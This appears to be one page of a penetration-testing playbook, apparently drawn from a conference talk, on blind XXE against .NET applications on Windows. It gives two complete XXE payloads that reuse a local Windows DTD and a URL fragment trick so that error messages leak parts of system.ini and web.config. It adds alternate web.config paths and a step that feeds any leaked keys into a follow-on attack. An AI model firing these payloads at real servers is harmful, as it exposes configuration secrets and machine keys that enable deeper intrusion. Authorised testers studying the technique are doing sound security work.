# Batch 06 — Blind XXE + partial file leak

## GOAL
When XML is parsed with stack traces but no outbound HTTP, leak file bits via **local DTD + `#` fragment**.

## TIME
~1 hour

## YOU NEED
- XML endpoint  
- Errors/stack traces on  
- Optional OAST  

---

## WHY (30 seconds)

**XXE** = evil XML says “also load this file/URL.”  

Hard mode (talk constraints):

- No outbound HTTP  
- File content not shown in normal response  
- But **errors are on**

Trick from the deck:

1. Use a **local DTD** already on Windows to redefine entities.  
2. Put file data in a URL **fragment** (`#...`) so .NET error text prints a **piece** of the file (**@nytr0gen_** / fragment identifier).  

Even partial `web.config` can give keys → batch 04.

---

## DO THIS

### 1) Prove XML + errors

Send good XML vs broken XML. Save stack trace sample.

### 2) Local DTD attempt 1 (system.ini — baseline)

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///c:/windows/system.ini">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<message>any text</message>
```

POST as the app expects (`Content-Type: application/xml` or field name).  
**Win:** any file text in error.  
**Talk failure mode:** `EntityName` parse error with no data → go to step 3.

### 3) Fragment identifier attempt 2 (partial web.config)

```xml
<?xml version="1.0" ?>
<!DOCTYPE doc [
  <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///C:/inetpub/wwwroot/web.config">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/#&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ENTITY test "test">
  '>
  %local_dtd;
]>
<xxx>test</xxx>
```

Try other paths if needed:

```text
file:///D:/webserv2/services/web.config
file:///C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web.config
```

### 4) Write down

```text
XXE errors: yes/no
Partial file: yes/no
Keys seen: yes/no
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| Partial web.config / keys | → **04** |
| No errors | Stop XXE → **07** |
| DNS only | Report limited XXE |

---

## NEXT
→ [07-shortname-fuzz.md](./07-shortname-fuzz.md)  
or **04** if keys found  

**Slide map:** deck slides 23–28 (constraints, local DTD attempts, fragment win).